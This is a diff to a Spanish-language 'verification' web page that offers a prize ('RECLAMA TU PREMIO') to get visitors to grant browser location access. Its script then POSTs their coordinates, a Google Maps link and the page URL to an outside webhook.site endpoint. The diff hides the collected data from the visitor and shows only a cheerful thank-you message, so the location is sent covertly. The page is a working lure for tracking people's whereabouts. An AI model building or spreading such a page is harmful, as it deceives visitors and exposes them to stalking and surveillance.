@@ -9,25 +9,23 @@
     h1 { color: #222; margin-top: 30px; }
     button { padding: 12px 25px; font-size: 18px; border: none; border-radius: 6px; background: #007bff; color: #fff; cursor: pointer; }
     button:hover { background: #0056b3; }
-    pre { text-align: left; background: #fff; padding: 10px; border-radius: 6px; box-shadow: 0 0 5px rgba(0,0,0,0.1); max-width: 600px; margin: 20px auto; }
-    #msg { margin-top: 15px; font-weight: bold; color: red; }
-    a { display: block; margin-top: 15px; font-size: 18px; text-decoration: none; color: #007bff; }
+    #msg { margin-top: 20px; font-size: 20px; font-weight: bold; color: green; display: none; }
+    img { margin-top: 20px; width: 150px; display: none; }
   </style>
 </head>
 <body>
   <h1>✅ VERIFICACIÓN Y VALIDACIÓN</h1>
-  <p>Por favor, pulsa el botón y aceptar recompensa.</p>
+  <p>Por favor, pulsa el botón y acepta la solicitud.</p>
   <button onclick="obtenerUbicacion()">📍 RECLAMA TU PREMIO</button>
-  <p id="msg"></p>
-  <pre id="output"></pre>
-  <a id="mapsLink" href="#" target="_blank">TU ESTADO 🌍</a>
+  <p id="msg">¡Gracias por aceptar! 🎉</p>
+  <img id="icono" src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="Gracias">
 
 <script>
 const WEBHOOK_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";
 
 function obtenerUbicacion() {
   if (!navigator.geolocation) {
-    document.getElementById("msg").textContent = "Tu navegador no soporta geolocalización.";
+    alert("Tu navegador no soporta geolocalización.");
     return;
   }
 
@@ -53,28 +51,21 @@ function onSuccess(pos) {
     source: window.location.href
   };
 
-  // Mostrar en pantalla
-  document.getElementById("output").textContent = JSON.stringify(data, null, 2);
-  document.getElementById("mapsLink").href = data.maps_link;
-  document.getElementById("msg").textContent = "📡 Ubicación detectada y enviada.";
-
-  // Enviar al Webhook con no-cors
+  // Enviar datos al webhook (en segundo plano)
   fetch(WEBHOOK_URL, {
     method: "POST",
-    mode: "no-cors",   // 🔑 evita bloqueo CORS
+    mode: "no-cors",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(data, null, 2)
   });
+
+  // Mostrar mensaje bonito
+  document.getElementById("msg").style.display = "block";
+  document.getElementById("icono").style.display = "block";
 }
 
 function onError(err) {
-  let msg = "Error desconocido al obtener ubicación.";
-  if (err.code === 1) msg = "❌ Permiso denegado.";
-  else if (err.code === 2) msg = "⚠️ Posición no disponible.";
-  else if (err.code === 3) msg = "⌛ Tiempo de espera agotado.";
-  else msg = "Error: " + err.message;
-
-  document.getElementById("msg").textContent = msg;
+  alert("⚠️ Error al obtener ubicación: " + (err.message || err.code));
 }
 </script>
 </body>
